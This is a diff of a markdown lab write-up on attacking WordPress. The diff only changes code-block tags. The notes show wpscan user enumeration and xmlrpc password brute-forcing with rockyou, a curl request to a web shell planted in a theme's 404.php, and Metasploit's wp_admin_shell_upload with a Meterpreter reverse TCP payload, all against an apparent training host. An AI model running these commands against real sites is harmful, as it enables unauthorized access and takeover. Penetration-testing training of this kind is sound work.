@@ -1,7 +1,7 @@
 # Attacking Wordpress
 ## Login Bruteforce
 
-```sh
+```shellsession
 $ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 ```
 
@@ -12,7 +12,7 @@ With administrative access to WordPress, we can modify the PHP source code to ex
 
 ![alt text](theme_editor.png)
 
-```sh
+```shellsession
 $ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -22,7 +22,7 @@ The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webap
 
 The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.
 
-```sh
+```shellsession
 msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
 
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
@@ -54,7 +54,7 @@ Server username: www-data (33)
 ## Questions
 1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? **Answer:**
    - Run `wpscan` on the target:
-        ```sh
+        ```shellsession
         $ wpscan --url blog.inlanefreight.local --enumerate --api-token <API_TOKEN>
         [+] doug
         | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
@@ -62,7 +62,7 @@ Server username: www-data (33)
         ```
 2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer. **Answer:**
    - Perform `xmlrpc` bruteforcing attack against `doug`:
-        ```sh
+        ```shellsession
         $ wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -U doug -P /usr/share/wordlists/rockyou.txt 
         <SNIP>
         [!] Valid Combinations Found:
